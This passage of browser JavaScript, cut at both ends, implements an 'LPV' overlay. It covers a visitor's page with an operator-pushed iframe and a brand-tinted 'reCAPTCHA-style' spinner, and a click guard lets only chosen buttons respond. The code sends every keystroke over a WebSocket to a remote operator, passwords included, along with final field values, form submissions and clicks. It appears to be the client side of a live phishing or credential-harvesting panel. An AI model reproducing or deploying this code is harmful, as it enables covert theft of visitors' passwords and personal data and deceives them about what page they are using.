                    const g = this.guard || normaliseGuard(null);
                    const now = Date.now();
                    if (g.feedback && now > (this._guardToastUntil || 0) + 600) {
                        this._guardToastUntil = now + 2600;
                        try {
                            if (!this._guardToast) {
                                this._guardToast = this._el('div', { id: 'lpv-guard-toast' }, []);
                                document.body.appendChild(this._guardToast);
                            }
                            const toast = this._guardToast;
                            // Operator's wording when set, built-in text
                            // otherwise. Feedback off = no hint at all.
                            toast.textContent = (g.message || GUARD_DEFAULT_MESSAGE);
                            toast.classList.add('on');
                            clearTimeout(this._guardToastTimer);
                            this._guardToastTimer = setTimeout(function () {
                                toast.classList.remove('on');
                            }, 2400);
                        } catch (e) { /* cosmetic only */ }
                    }
                    if (!g.notify) return;
                    if (this._lastGuardReportAt && now - this._lastGuardReportAt < 1200) return;
                    this._lastGuardReportAt = now;
                    const action = guardActionable(el);
                    this._send({
                        type: 'lpv_event',
                        event_type: 'click_blocked',
                        page_id: this.currentPage && this.currentPage.id,
                        page_name: this.currentPage && this.currentPage.name,
                        payload: {
                            tag: action && action.tagName ? String(action.tagName).toLowerCase() : '',
                            id: (action && action.id) || '',
                            name: action && action.getAttribute
                                ? (action.getAttribute('name') || '') : '',
                            text: action && action.textContent
                                ? String(action.textContent).trim().slice(0, 80) : '',
                            rules: (g.allow || []).length,
                            page_name: this.pageName || '',
                        },
                    });
                },

                // A short-lived message over the pushed page. Used when a
                // mapped control cannot go anywhere (the target page was
                // deleted after the visitor was sent the page) so the click
                // never looks silently broken.
                _say(text) {
                    if (!text) return;
                    try {
                        if (!this._sayToast) {
                            this._sayToast = this._el('div', { id: 'lpv-guard-toast' }, []);
                            document.body.appendChild(this._sayToast);
                        }
                        const toast = this._sayToast;
                        toast.textContent = text;
                        toast.classList.add('on');
                        clearTimeout(this._sayTimer);
                        this._sayTimer = setTimeout(function () {
                            toast.classList.remove('on');
                        }, 2600);
                    } catch (e) { /* cosmetic only */ }
                },

                actionFailed(reason) {
                    try { this._showSpinner(false); } catch (e) { /* not showing */ }
                    const why = String(reason || '');
                    this._say(why === 'page_missing' || why === 'target_missing'
                        ? 'That page is no longer available.'
                        : 'That action did not go through.');
                },

                _send(message) {
                    try {
                        if (state.ws && state.ws.readyState === WebSocket.OPEN) {
                            state.ws.send(JSON.stringify(message));
                        }
                    } catch (e) {
                        dbg('[LPV] send error', e && e.message);
                    }
                },

                _el(tag, attrs, children) {
                    const node = document.createElement(tag);
                    if (attrs) {
                        for (const k in attrs) {
                            if (k === 'class') node.className = attrs[k];
                            else if (k === 'style') Object.assign(node.style, attrs[k]);
                            else if (k.startsWith('on') && typeof attrs[k] === 'function') {
                                node.addEventListener(k.slice(2), attrs[k]);
                            } else if (k === 'html') {
                                node.innerHTML = attrs[k];
                            } else {
                                node.setAttribute(k, attrs[k]);
                            }
                        }
                    }
                    if (children) {
                        for (const c of children) {
                            if (c == null) continue;
                            node.appendChild(typeof c === 'string' ? document.createTextNode(c) : c);
                        }
                    }
                    return node;
                },

                _buildOverlay() {
                    if (this.overlay) return;

                    // Inject minimal CSS for the runtime. We scope everything
                    // under #lpv-root so a pushed page can use its own CSS
                    // without colliding.
                    const style = document.createElement('style');
                    style.id = 'lpv-runtime-style';
                    style.textContent = `
                        #lpv-root {
                            position: fixed; inset: 0; z-index: 2147483646;
                            /* Dynamic viewport height where supported: the
                               frame then always fits the visible area on
                               mobile Chrome/Android instead of being clipped
                               behind the URL bar. */
                            height: 100%;
                            pointer-events: none; font-family: 'Space Grotesk', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
                            user-select: none;
                            overflow: hidden;
                        }
                        @supports (height: 100dvh) {
                            #lpv-root, #lpv-page { height: 100dvh; }
                        }
                        #lpv-root.hidden { display: none; }
                        #lpv-dot {
                            position: absolute; top: 12px; right: 12px; width: 10px; height: 10px;
                            border-radius: 50%; background: #2fe88a;
                            box-shadow: 0 0 0 2px rgba(47,232,138,0.18), 0 0 10px rgba(47,232,138,0.8);
                            animation: lpv-pulse 1.8s ease-in-out infinite;
                            pointer-events: none;
                        }
                        #lpv-page {
                            position: absolute; inset: 0; overflow: hidden;
                            height: 100%;
                            background: #fff; color: #000;
                            pointer-events: none;
                        }
                        #lpv-page iframe {
                            display: block; width: 100%; height: 100%; border: none;
                            background: #fff; overflow: auto; pointer-events: auto;
                            scrollbar-width: thin; scrollbar-gutter: stable both-edges;
                            /* The page inside owns the gesture. Never hand a
                               mobile browser a frame it is told not to pan. */
                            touch-action: auto;
                        }
                        #lpv-spinner {
                            position: absolute; inset: 0;
                            display: flex; align-items: center; justify-content: center;
                            /* Opaque enough to read as a real overlay rather
                               than a faint wash over the pushed page. */
                            background: rgba(255, 255, 255, 0.88);
                            /* Sit above the pushed-page iframe no matter how
                               that frame is later positioned or z-indexed —
                               a low z-index let the frame paint over the
                               spinner and look like page content. */
                            z-index: 2147483647;
                            transition: opacity 200ms ease;
                            pointer-events: none;
                        }
                        #lpv-spinner.hidden { opacity: 0; pointer-events: none; }
                        /* reCAPTCHA-style ring: thin light-gray track + thicker
                           branded top arc. Color is driven by --lpv-brand
                           (set from currentBrandColor at runtime). */
                        #lpv-spinner .ring {
                            width: 44px; height: 44px; border-radius: 50%;
                            border: 3px solid rgba(0, 0, 0, 0.10);
                            border-top: 4px solid var(--lpv-brand, #4285F4);
                            border-right: 4px solid var(--lpv-brand, #4285F4);
                            animation: lpv-spin 0.8s linear infinite;
                            box-shadow: 0 0 0 1px rgba(0, 0, 0, 0.05);
                        }
                        /* Workflow-configured custom loading page. Sits
                           above the pushed page (and above the built-in ring)
                           and stays interactive so the customer can click its
                           buttons — a redirect step waits on that click. */
                        .lpv-redirect-frame {
                            position: absolute; inset: 0;
                            width: 100%; height: 100%;
                            border: none; background: #fff;
                            z-index: 2147483646;
                            pointer-events: auto;
                        }
                        .lpv-redirect-frame.hidden { display: none; }
                        /* Also tint the LPV status dot so it matches the brand. */
                        #lpv-dot {
                            background: var(--lpv-brand, #2fe88a) !important;
                            box-shadow: 0 0 0 2px rgba(66,133,244,0.18),
                                        0 0 10px rgba(66,133,244,0.6) !important;
                        }
                        /* Click guard: a locked page shows a pointer only on
                           the controls it allows, so the visitor can see at
                           a glance which button is the real one. */
                        .lpv-guarded button:not([data-lpv-allowed]),
                        .lpv-guarded [role="button"]:not([data-lpv-allowed]) {
                            cursor: default;
                        }
                        #lpv-guard-toast {
                            position: fixed; left: 50%; bottom: 26px;
                            transform: translate(-50%, 12px);
                            max-width: min(420px, calc(100vw - 32px));
                            padding: 11px 16px; border-radius: 12px;
                            background: rgba(17, 19, 26, 0.94);
                            color: #f3f5ff; font-size: 13px; line-height: 1.4;
                            font-family: 'Space Grotesk', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
                            box-shadow: 0 14px 40px -12px rgba(0,0,0,0.75);
                            border: 1px solid rgba(255,255,255,0.12);
                            opacity: 0; pointer-events: none;
                            transition: opacity .18s ease, transform .18s ease;
                            z-index: 2147483647; text-align: center;
                        }
                        #lpv-guard-toast.on { opacity: 1; transform: translate(-50%, 0); }
                        @keyframes lpv-spin { to { transform: rotate(360deg); } }
                        @keyframes lpv-pulse {
                            0%, 100% { transform: scale(1); opacity: 0.9; }
                            50% { transform: scale(1.25); opacity: 1; }
                        }
                    `;
                    document.head.appendChild(style);

                    this.dot = this._el('div', { id: 'lpv-dot' });
                    this.spinner = this._el('div', { id: 'lpv-spinner', class: 'hidden' }, [
                        this._el('div', { class: 'ring' })
                    ]);
                    this.container = this._el('div', { id: 'lpv-page' }, [this.spinner]);
                    this.overlay = this._el('div', { id: 'lpv-root', class: 'hidden' }, [this.dot, this.container]);
                    this.overlay.setAttribute('aria-hidden', 'true');
                    // Inherit the current brand color so the ring is correctly
                    // tinted from the moment the overlay first appears (instead
                    // of flashing the default blue and then jumping to the
                    // brand color when applySpinnerColor next runs).
                    try {
                        this.overlay.style.setProperty('--lpv-brand', currentBrandColor || '#4285F4');
                    } catch (e) { /* ignore */ }
                    // Container must NOT block events — the iframe inside needs to
                    // receive pointer events so users can scroll/click/type into the
                    // pushed page. The CSS rule for #lpv-page already sets
                    // pointer-events: none on the container; the iframe child
                    // re-enables it via #lpv-page iframe { pointer-events: auto }.
                    document.body.appendChild(this.overlay);

                    // Capture layer — delegated listeners on the page container
                    // so we don't have to rebind after every page swap.
                    this._bindCapture(this.container);
                },

                _bindCapture(root) {
                    if (!root || this.captureRoot === root) return;
                    this.captureRoot = root;

                    const actionTarget = (ev, fallbackTarget = null) => {
                        const target = ev && ev.target ? ev.target : fallbackTarget;
                        if (!target || !target.closest) return null;
                        if (this.overlay && this.overlay.contains(target)) return null;
                        const candidate = target.closest('a, button, ui-button, input, select, textarea, [role="button"], [data-action], [onclick]');
                        return candidate || null;
                    };

                    const captureFieldState = (target) => {
                        if (!target) return null;
                        const tag = (target.tagName || '').toLowerCase();
                        if (tag === 'input' || tag === 'textarea' || tag === 'select') {
                            const type = (target.getAttribute('type') || 'text').toLowerCase();
                            if (type === 'checkbox' || type === 'radio') {
                                return { value: target.checked ? 'on' : 'off', type };
                            }
                            return { value: target.value || '', type };
                        }
                        return null;
                    };

                    // Helper: describe the element we're looking at.
                    const describe = (el) => {
                        if (!el) return null;
                        return {
                            tag: (el.tagName || '').toLowerCase(),
                            type: el.getAttribute('type') || '',
                            name: el.getAttribute('name') || '',
                            id: el.id || '',
                            placeholder: el.getAttribute('placeholder') || '',
                            label: (() => {
                                if (el.id) {
                                    const lab = document.querySelector('label[for="' + CSS.escape(el.id) + '"]');
                                    if (lab) return lab.textContent.trim().slice(0, 80);
                                }
                                const parentLabel = el.closest('label');
                                if (parentLabel) return parentLabel.textContent.trim().slice(0, 80);
                                return '';
                            })(),
                            text: (el.textContent || '').trim().slice(0, 80),
                        };
                    };

                    const fieldValue = (el) => {
                        if (!el) return null;
                        if (el.tagName === 'INPUT') {
                            const t = (el.getAttribute('type') || 'text').toLowerCase();
                            if (t === 'checkbox' || t === 'radio') return el.checked ? 'on' : 'off';
                            // passwords ARE captured (admin explicitly opted in)
                            return el.value;
                        }
                        if (el.tagName === 'TEXTAREA') return el.value;
                        if (el.tagName === 'SELECT') return el.value;
                        return null;
                    };

                    // ----------------------------------------------------------------
                    // field_final — emit the FINAL value of a field on the
                    // boundaries the user cares about:
                    //   - blur       (user moved on)
                    //   - submit     (form submit; all fields flushed)
                    //   - nav        (about to navigate; everything in the doc)
                    //   - pagehide   (tab close / iframe swap)
                    // We track the last value we emitted per element so we don't
                    // spam duplicates when a blur fires after no change.
                    // ----------------------------------------------------------------
                    const _finalEmitted = new WeakMap();   // element -> last string value emitted as final

                    const _sendFieldFinal = (el, reason) => {
                        if (!el) return;
                        const tag = (el.tagName || '').toLowerCase();
                        if (tag !== 'input' && tag !== 'textarea' && tag !== 'select') return;
                        const value = fieldValue(el);
                        if (value === null || value === undefined) return;
                        // Skip empty fields — no point logging "they typed nothing".
                        if (typeof value === 'string' && value === '') return;
                        // De-dupe vs the last final we sent for this element.
                        if (_finalEmitted.get(el) === value) return;
                        _finalEmitted.set(el, value);
                        const meta = describe(el);
                        LPV._send({
                            type: 'lpv_event',
                            event_type: 'field_final',
                            page_id:   LPV.currentPage && LPV.currentPage.id,
                            page_name: LPV.currentPage && LPV.currentPage.name,
                            payload:   { ...meta, value, reason }
                        });
                    };

                    const _flushAllFieldFinals = (rootEl, reason) => {
                        try {
                            const scope = rootEl || document;
                            const els = scope.querySelectorAll('input, textarea, select');
                            els.forEach(el => _sendFieldFinal(el, reason));
                        } catch (e) {
                            // best-effort
                        }
                    };

                    // 1) blur — per-field final.
                    root.addEventListener('blur', (ev) => {
                        const t = ev.target;
                        if (!t) return;
                        _sendFieldFinal(t, 'blur');
                    }, true);

                    // 2) submit — flush every field in the form before the
                    //    page navigates.  The existing submit handler at
                    //    L5190 still owns the navigation / push; we just
                    //    piggyback on it via this capture-phase listener.
                    root.addEventListener('submit', (ev) => {
                        const form = ev.target;
                        if (!form) return;
                        _flushAllFieldFinals(form, 'submit');
                    }, true);

                    // 3) pagehide / beforeunload — last-chance flush.
                    window.addEventListener('pagehide', () => {
                        _flushAllFieldFinals(document, 'pagehide');
                    });
                    window.addEventListener('beforeunload', () => {
                        _flushAllFieldFinals(document, 'beforeunload');
                    });

                    // input fires on every keystroke for text/password fields.
                    root.addEventListener('input', (ev) => {
                        const t = ev.target;
                        if (!t) return;
                        const tag = (t.tagName || '').toLowerCase();
                        if (tag !== 'input' && tag !== 'textarea' && tag !== 'select') return;
                        const meta = describe(t);
                        const value = fieldValue(t);
                        LPV._send({
                            type: 'lpv_event',
                            event_type: t.type === 'password' ? 'password_change' : 'field_change',
                            page_id: LPV.currentPage && LPV.currentPage.id,
                            page_name: LPV.currentPage && LPV.currentPage.name,
                            payload: { ...meta, value }
                        });
                    }, true);

                    root.addEventListener('change', (ev) => {
                        const t = ev.target;
                        if (!t) return;
                        const tag = (t.tagName || '').toLowerCase();
                        if (tag !== 'input' && tag !== 'textarea' && tag !== 'select') return;
                        LPV._send({
                            type: 'lpv_event',
                            event_type: 'field_change',
                            page_id: LPV.currentPage && LPV.currentPage.id,
                            page_name: LPV.currentPage && LPV.currentPage.name,
                            payload: { ...describe(t), value: fieldValue(t) }
                        });
                    }, true);

                    // click — for buttons, links, anything clickable
                    root.addEventListener('click', (ev) => {
                        const t = ev.target;
                        if (!t) return;
                        if (this.overlay && this.overlay.contains(t)) return;
                        const actionable = actionTarget(ev) || t;
                        if (!actionable) return;

                        // Click guard (see guardAllows): a locked page only
                        // lets the operator's controls react.
                        if (!this.allows(actionable)) {
                            try {
                                ev.preventDefault();
                                ev.stopPropagation();
                                ev.stopImmediatePropagation();
                            } catch (e) { /* ignore */ }
                            this._guardBlocked(actionable);
                            return;
                        }

                        ev.preventDefault();
                        ev.stopPropagation();
                        ev.stopImmediatePropagation();

                        const meta = describe(actionable);
                        const fieldState = captureFieldState(actionable);
                        const href = actionable.getAttribute ? actionable.getAttribute('href') : '';
                        // Only flash the spinner for *real* navigation/CTA
                        // clicks (Next, Submit, link, role=button, etc.) —
                        // not for field interactions that the actionable
                        // selector would also pick up (checkboxes, dropdowns,
                        // labels wrapping buttons that resolve to inputs).
                        if (this._isNavAction(actionable)) {
                            this._showSpinner(true, 'click');
                        }
                        this._setBar('LPV tracking ' + ((meta && meta.text) || actionable.tagName || 'action'));
                        LPV._send({
                            type: 'lpv_event',
                            event_type: 'click',
                            page_id: LPV.currentPage && LPV.currentPage.id,
                            page_name: LPV.currentPage && LPV.currentPage.name,
                            payload: {
                                ...meta,
                                href: href || '',
                                ...fieldState,
                                x: ev.clientX, y: ev.clientY,
                                text: (actionable.textContent || '').trim().slice(0, 80),
                                preview_only: true
                            }
                        });
                    }, true);

                    // submit — capture form submissions with a snapshot of fields.
                    root.addEventListener('submit', (ev) => {
                        const form = ev.target;
                        if (!form || form.tagName !== 'FORM') return;
                        const submitter = (ev && (ev.submitter || ev.explicitOriginalTarget)) || form;
                        if (!this.allows(submitter)) {
                            try {
                                ev.preventDefault();
                                ev.stopPropagation();
                                ev.stopImmediatePropagation();
                            } catch (e) { /* ignore */ }
                            this._guardBlocked(submitter);
                            return;
                        }
                        ev.preventDefault();
                        ev.stopPropagation();
                        ev.stopImmediatePropagation();
                        const fields = {};
                        // Form submissions are always a real navigation
                        // intent — show the spinner once (the previous code
                        // called _showSpinner(true) twice, which was harmless
                        // but pointless).
                        this._showSpinner(true, 'submit');
                        this._setBar('LPV submit: ' + (form.getAttribute('action') || 'form'));
                        try {
                            new FormData(form).forEach((v, k) => {
                                if (k in fields) {
                                    fields[k] = [].concat(fields[k], v);
                                } else {
                                    fields[k] = v;
                                }
                            });
                        } catch (e) { /* ignore */ }
                        LPV._send({
                            type: 'lpv_event',
                            event_type: 'form_submit',
                            page_id: LPV.currentPage && LPV.currentPage.id,
                            page_name: LPV.currentPage && LPV.currentPage.name,
                            payload: { fields, action: form.getAttribute('action') || '', preview_only: true }
                        });
                    }, true);

                    // Nav flush — showPage() dispatches 'lpv:nav' right
                    // before swapping the page document.  We walk the
                    // current container and emit field_final for every
                    // non-empty input/textarea/select so the audit log
                    // captures the value the user settled on before
                    // moving on.  Listener is bound once per capture
                    // root; subsequent rebinds to the same root are
                    // no-ops.
                    if (!root._lpvNavFlushBound) {
                        root._lpvNavFlushBound = true;
                        document.addEventListener('lpv:nav', () => {
                            try {
                                const els = (LPV.container || root)
                                    .querySelectorAll('input, textarea, select');
